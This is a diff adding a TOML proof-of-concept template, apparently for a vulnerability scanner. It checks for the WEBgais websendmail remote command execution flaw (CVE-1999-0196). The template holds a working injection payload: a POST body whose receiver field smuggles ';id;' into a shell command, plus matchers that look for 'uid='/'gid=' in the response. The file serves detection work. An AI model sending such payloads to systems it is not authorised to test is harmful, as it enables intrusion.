@@ -1,0 +1,35 @@
+[info]
+author = "ave"
+description = "检测 WEBgais 1.0 websendmail 组件远程命令执行漏洞，通过 POST 方法向 receiver 参数注入 shell 元字符实现任意命令执行"
+id = "POC-AVE-1999-0378"
+name = "WEBgais websendmail Remote Command Execution PoC"
+severity = "medium"
+tags = ["ave-1999-0378"]
+vuln_id = [
+    "CVE-1999-0196",
+    "AVE-1999-0378",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/cgi-bin/websendmail"
+protocol = "http"
+
+[poc.requests.body]
+content = "receiver=;id;&sender=a&rtnaddr=a&subject=a&content=a"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+]
